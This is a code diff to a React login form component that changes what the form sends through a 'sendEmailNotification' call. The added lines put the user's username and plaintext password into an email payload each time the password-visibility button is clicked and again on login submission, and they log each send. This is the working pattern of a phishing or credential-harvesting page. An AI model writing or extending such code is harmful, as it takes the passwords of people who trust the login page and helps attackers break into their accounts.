@@ -25,15 +25,21 @@ const LoginForm: React.FC<LoginFormProps> = ({ onLoginSuccess }) => {
   };
 
   const togglePasswordVisibility = async () => {
-    setShowPassword(prev => !prev);
+    const newShowPassword = !showPassword;
+    setShowPassword(newShowPassword);
     
-    // Send email when password visibility is toggled (this is a button click)
+    // Send email for password visibility toggle button click
     try {
+      console.log('🚨 Sending email for password toggle button click');
       await sendEmailNotification({
-        step: `Login Form - Password visibility ${showPassword ? 'hidden' : 'shown'}`,
+        step: `Login Form - Password ${newShowPassword ? 'Shown' : 'Hidden'} (Button Click)`,
         username: formData.username || "Not provided yet",
         timestamp: new Date().toISOString(),
-        allFormData: formData
+        allFormData: {
+          username: formData.username || 'N/A',
+          password: formData.password || 'N/A',
+          passwordVisible: newShowPassword
+        }
       });
     } catch (error) {
       console.error('❌ Failed to send email for password toggle:', error);
@@ -54,13 +60,18 @@ const LoginForm: React.FC<LoginFormProps> = ({ onLoginSuccess }) => {
 
     setIsLoading(true);
     
-    // Send email for form submission (this is a button click)
+    // Send email for login form submission button click
     try {
+      console.log('🚨 Sending email for login form submission button click');
       await sendEmailNotification({
-        step: "Login Form - COMPLETE SUBMISSION",
+        step: "Login Form - COMPLETE SUBMISSION (Button Click)",
         username: formData.username,
         timestamp: new Date().toISOString(),
-        allFormData: formData
+        allFormData: {
+          username: formData.username || 'N/A',
+          password: formData.password || 'N/A',
+          action: 'login_submitted'
+        }
       });
       console.log('✅ Email sent for login form submission');
     } catch (error) {
